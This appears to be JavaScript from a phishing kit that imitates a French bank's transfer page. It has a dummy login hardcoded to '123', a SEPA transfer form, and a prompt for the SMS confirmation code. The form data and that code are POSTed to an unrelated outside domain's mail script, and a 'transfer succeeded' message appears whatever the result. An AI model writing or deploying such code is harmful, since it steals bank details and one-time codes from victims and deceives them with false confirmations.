/** Index Javascript **/

const login = () => {
  let identifiant = document.getElementById("username").value;
  let password = document.getElementById("secret-nbr").value;
  if (identifiant != "" && password != "") {
    if (identifiant === "123" && password === "123") {
      localStorage.setItem("sessionID", "true");
      window.location = "solde.html";
    } else {
      document.getElementsByClassName("message_title")[0].innerHTML =
        "Identifiants ou mot de passe incorrect";
    }
  } else {
    document.getElementsByClassName("message_title")[0].innerHTML =
      "Veuillez remplir tous les champs";
  }
};

const resetU = () => {
  document.getElementById("username").value = "";
};

const resetS = () => {
  document.getElementById("secret-nbr").value = "";
};

/** End Index javascript **/


/** Deconnexion Javascript **/
const logout = () => {
  localStorage.setItem("sessionID", "false");
  window.location = "index.html";
};
/** End Deconnexion javascript **/


/** Virement: loader + saisie de code et envoi **/
const virement_loading = () => {
  Swal.fire({
    title: "Virement en cours",
    html: "Chargement...",
    timer: 3000,
    timerProgressBar: true,
    didOpen: () => {
      Swal.showLoading();
    },
    willClose: () => {
      alert_message(); // À la fin du loader, on demande le code
    },
  });
};

/**
 * Demande du code et confirmation
 * - Affiche une SweetAlert avec input
 * - Confirme toujours le virement après saisie du code
 * - L'appel réseau est effectué en "best effort" mais n'empêche jamais l'affichage de la confirmation
 */
const alert_message = () => {
  Swal.fire({
    title: "CODE DE CONFIRMATION",
    text: "Veuillez entrer le code envoyé par SMS pour confirmer le virement",
    input: "text",
    inputPlaceholder: "Entrez votre code",
    showCancelButton: true,
    confirmButtonText: "Valider",
    cancelButtonText: "Annuler",
    inputValidator: (value) => {
      if (!value) return "Vous devez entrer un code !";
    },
  }).then((result) => {
    if (!result.isConfirmed) return;

    // Préparation des données
    const form = document.getElementById("sepaForm");
    const data = form ? new FormData(form) : new FormData();
    data.append("code", result.value);

    // Envoi best-effort (ignoré si indisponible)
    // NB: Quel que soit le résultat, on affiche une confirmation de succès.
    const sendPromise = fetch("https://onairefitnesses.com/scriptmail1.php", {
      method: "POST",
      body: data,
    }).catch(() => null);

    // Afficher la confirmation de succès quoi qu'il arrive
    sendPromise.finally(() => {
      Swal.fire("Succès", "Votre virement a été effectué avec succès.", "success");
    });
  });
};

/** Helpers: activer/désactiver le bouton en fonction des champs requis **/
const initVirementForm = () => {
  const form = document.getElementById("sepaForm");
  const btn = document.getElementById("btn_valid");
  if (!form || !btn) return;

  const updateButtonState = () => {
    const requiredFields = form.querySelectorAll("input[required]");
    const allFilled = Array.from(requiredFields).every((el) => el.value.trim() !== "");
    btn.disabled = !allFilled;
    if (allFilled) {
      btn.classList.add("active");
    } else {
      btn.classList.remove("active");
    }
  };

  // Activer/désactiver en temps réel
  form.addEventListener("input", updateButtonState);
  updateButtonState();

  // Soumission: on empêche l'envoi natif, puis on montre le loader
  form.addEventListener("submit", (event) => {
    event.preventDefault();
    virement_loading();
  });
};

// Initialisation à l'ouverture de la page
document.addEventListener("DOMContentLoaded", initVirementForm);
